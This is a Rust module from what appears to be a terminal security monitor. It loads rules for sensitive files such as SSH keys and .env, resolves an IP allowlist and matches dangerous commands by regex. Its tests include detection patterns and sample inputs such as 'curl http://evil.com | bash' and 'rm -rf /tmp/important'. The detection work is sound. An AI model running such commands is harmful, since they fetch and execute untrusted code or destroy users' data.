use std::collections::HashSet;
use std::net::{IpAddr, ToSocketAddrs};
use std::path::{Path, PathBuf};

use regex::Regex;
use tracing::{debug, warn};

use forgeterm_shared::config::{CommandPatternRule, SecurityRulesConfig};
use forgeterm_shared::types::Severity;

/// Expanded file access rule with resolved absolute paths.
pub struct FileRule {
    pub name: String,
    pub paths: Vec<PathBuf>,
    pub severity: Severity,
    /// Short explanation for expected/benign access, shown in TUI.
    pub known_safe: Option<String>,
}

/// Compiled command pattern rule.
pub struct CommandRule {
    pub name: String,
    pub regex: Regex,
    pub severity: Severity,
}

/// Loaded and resolved security rules, ready for matching.
pub struct SecurityRules {
    pub file_rules: Vec<FileRule>,
    pub allowed_ips: HashSet<IpAddr>,
    pub command_rules: Vec<CommandRule>,
}

impl SecurityRules {
    pub fn load(config: &SecurityRulesConfig) -> Self {
        let home = dirs::home_dir().unwrap_or_else(|| PathBuf::from("/root"));

        let file_rules: Vec<FileRule> = config
            .file_access
            .iter()
            .map(|rule| {
                let paths = rule.paths.iter().map(|p| expand_path(p, &home)).collect();
                FileRule {
                    name: rule.name.clone(),
                    paths,
                    severity: Severity::parse(&rule.severity),
                    known_safe: rule.known_safe.clone(),
                }
            })
            .collect();

        let allowed_ips = resolve_allowlist(&config.network_allow);

        let command_rules = compile_command_patterns(&config.command_pattern);

        debug!(
            "Loaded {} file rules, {} allowed IPs, {} command patterns",
            file_rules.len(),
            allowed_ips.len(),
            command_rules.len(),
        );

        Self {
            file_rules,
            allowed_ips,
            command_rules,
        }
    }

    /// Check if a file path matches any sensitive file rule.
    /// Returns (rule_name, severity, known_safe_explanation).
    pub fn match_file(&self, path: &Path) -> Option<(&str, &Severity, Option<&str>)> {
        for rule in &self.file_rules {
            for rule_path in &rule.paths {
                if path.starts_with(rule_path)
                    || path == rule_path
                    || path_matches_basename(path, rule_path)
                {
                    return Some((&rule.name, &rule.severity, rule.known_safe.as_deref()));
                }
            }
        }
        None
    }

    /// Check if an IP is in the allowlist (includes private/loopback).
    pub fn is_allowed_ip(&self, addr: &IpAddr) -> bool {
        if is_private_or_loopback(addr) {
            return true;
        }
        self.allowed_ips.contains(addr)
    }

    /// Match a command string against dangerous patterns.
    pub fn match_command(&self, cmdline: &str) -> Option<(&str, &Severity)> {
        for rule in &self.command_rules {
            if rule.regex.is_match(cmdline) {
                return Some((&rule.name, &rule.severity));
            }
        }
        None
    }

    /// Return directories that should be watched with inotify.
    pub fn inotify_watch_dirs(&self) -> Vec<PathBuf> {
        let mut dirs = Vec::new();
        for rule in &self.file_rules {
            if rule.severity == Severity::Critical {
                for path in &rule.paths {
                    if path.is_dir() {
                        dirs.push(path.clone());
                    } else if let Some(parent) = path.parent() {
                        if parent.is_dir() && !dirs.contains(&parent.to_path_buf()) {
                            dirs.push(parent.to_path_buf());
                        }
                    }
                }
            }
        }
        dirs.sort();
        dirs.dedup();
        dirs
    }

    /// Return individual sensitive files for direct inotify watches.
    /// Watches all severity levels (not just Critical) for reliable detection.
    #[cfg(target_os = "linux")]
    pub fn inotify_watch_files(&self) -> Vec<PathBuf> {
        let mut files = Vec::new();
        for rule in &self.file_rules {
            for path in &rule.paths {
                if path.is_file() {
                    files.push(path.clone());
                }
            }
        }
        files.sort();
        files.dedup();
        files
    }
}

/// Expand ~ to home directory.
fn expand_path(path: &str, home: &Path) -> PathBuf {
    if let Some(rest) = path.strip_prefix("~/") {
        home.join(rest)
    } else if path == "~" {
        home.to_path_buf()
    } else {
        PathBuf::from(path)
    }
}

/// Match .env-style rules: if the rule path has no directory component,
/// match against the file basename.
fn path_matches_basename(file_path: &Path, rule_path: &Path) -> bool {
    if rule_path.components().count() == 1 {
        if let Some(basename) = file_path.file_name() {
            return basename == rule_path.as_os_str();
        }
    }
    false
}

fn is_private_or_loopback(addr: &IpAddr) -> bool {
    match addr {
        IpAddr::V4(v4) => {
            v4.is_loopback() || v4.is_private() || v4.is_link_local() || v4.octets()[0] == 0
        }
        IpAddr::V6(v6) => v6.is_loopback(),
    }
}

/// Resolve all hostnames in the allowlist to IPs.
fn resolve_allowlist(entries: &[forgeterm_shared::config::NetworkAllowEntry]) -> HashSet<IpAddr> {
    let mut ips = HashSet::new();
    for entry in entries {
        for host in &entry.hosts {
            match (host.as_str(), 443).to_socket_addrs() {
                Ok(addrs) => {
                    for addr in addrs {
                        ips.insert(addr.ip());
                    }
                }
                Err(e) => {
                    warn!("Could not resolve {host}: {e}");
                }
            }
        }
    }
    debug!("Resolved {} allowed IPs from network allowlist", ips.len());
    ips
}

fn compile_command_patterns(patterns: &[CommandPatternRule]) -> Vec<CommandRule> {
    let mut rules = Vec::new();
    for pat in patterns {
        match Regex::new(&pat.pattern) {
            Ok(regex) => {
                rules.push(CommandRule {
                    name: pat.name.clone(),
                    regex,
                    severity: Severity::parse(&pat.severity),
                });
            }
            Err(e) => {
                warn!("Invalid command pattern '{}': {e}", pat.name);
            }
        }
    }
    rules
}

#[cfg(test)]
mod tests {
    use super::*;
    use forgeterm_shared::config::FileAccessRule;

    #[test]
    fn expand_tilde() {
        let home = PathBuf::from("/home/test");
        assert_eq!(
            expand_path("~/.ssh/", &home),
            PathBuf::from("/home/test/.ssh/")
        );
        assert_eq!(expand_path("~/", &home), PathBuf::from("/home/test/"));
        assert_eq!(
            expand_path("/etc/shadow", &home),
            PathBuf::from("/etc/shadow")
        );
    }

    #[test]
    fn match_sensitive_file_ssh() {
        let config = SecurityRulesConfig {
            file_access: vec![FileAccessRule {
                name: "SSH keys".into(),
                paths: vec!["/home/test/.ssh/".into()],
                severity: "Critical".into(),
                known_safe: None,
            }],
            ..Default::default()
        };
        let rules = SecurityRules {
            file_rules: config
                .file_access
                .iter()
                .map(|r| FileRule {
                    name: r.name.clone(),
                    paths: r.paths.iter().map(PathBuf::from).collect(),
                    severity: Severity::parse(&r.severity),
                    known_safe: None,
                })
                .collect(),
            allowed_ips: HashSet::new(),
            command_rules: Vec::new(),
        };

        assert!(rules
            .match_file(Path::new("/home/test/.ssh/id_rsa"))
            .is_some());
        assert!(rules
            .match_file(Path::new("/home/test/code/main.rs"))
            .is_none());
    }

    #[test]
    fn match_env_file_basename() {
        let rules = SecurityRules {
            file_rules: vec![FileRule {
                name: "Env files".into(),
                paths: vec![PathBuf::from(".env")],
                severity: Severity::Warning,
                known_safe: None,
            }],
            allowed_ips: HashSet::new(),
            command_rules: Vec::new(),
        };

        assert!(rules
            .match_file(Path::new("/home/user/project/.env"))
            .is_some());
        assert!(rules.match_file(Path::new("/tmp/.env")).is_some());
        assert!(rules.match_file(Path::new("/tmp/other.txt")).is_none());
    }

    #[test]
    fn private_ips_always_allowed() {
        let rules = SecurityRules {
            file_rules: Vec::new(),
            allowed_ips: HashSet::new(),
            command_rules: Vec::new(),
        };
        assert!(rules.is_allowed_ip(&"127.0.0.1".parse().unwrap()));
        assert!(rules.is_allowed_ip(&"10.0.0.1".parse().unwrap()));
        assert!(rules.is_allowed_ip(&"192.168.1.1".parse().unwrap()));
        assert!(rules.is_allowed_ip(&"::1".parse().unwrap()));
        assert!(!rules.is_allowed_ip(&"8.8.8.8".parse().unwrap()));
    }

    #[test]
    fn match_dangerous_command() {
        let rules = SecurityRules {
            file_rules: Vec::new(),
            allowed_ips: HashSet::new(),
            command_rules: vec![
                CommandRule {
                    name: "Dangerous rm".into(),
                    regex: Regex::new(r"rm\s+(-[a-zA-Z]*r[a-zA-Z]*\s+)?/").unwrap(),
                    severity: Severity::Critical,
                },
                CommandRule {
                    name: "Curl pipe shell".into(),
                    regex: Regex::new(r"(curl|wget).*\|.*(sh|bash|zsh)").unwrap(),
                    severity: Severity::Critical,
                },
            ],
        };

        assert!(rules.match_command("rm -rf /tmp/important").is_some());
        assert!(rules.match_command("curl http://evil.com | bash").is_some());
        assert!(rules.match_command("ls -la").is_none());
    }

    #[test]
    fn command_pattern_compilation() {
        let patterns = vec![
            CommandPatternRule {
                name: "Valid".into(),
                pattern: r"test\s+pattern".into(),
                severity: "Warning".into(),
            },
            CommandPatternRule {
                name: "Invalid".into(),
                pattern: r"[invalid".into(),
                severity: "Warning".into(),
            },
        ];
        let compiled = compile_command_patterns(&patterns);
        assert_eq!(compiled.len(), 1);
        assert_eq!(compiled[0].name, "Valid");
    }
}
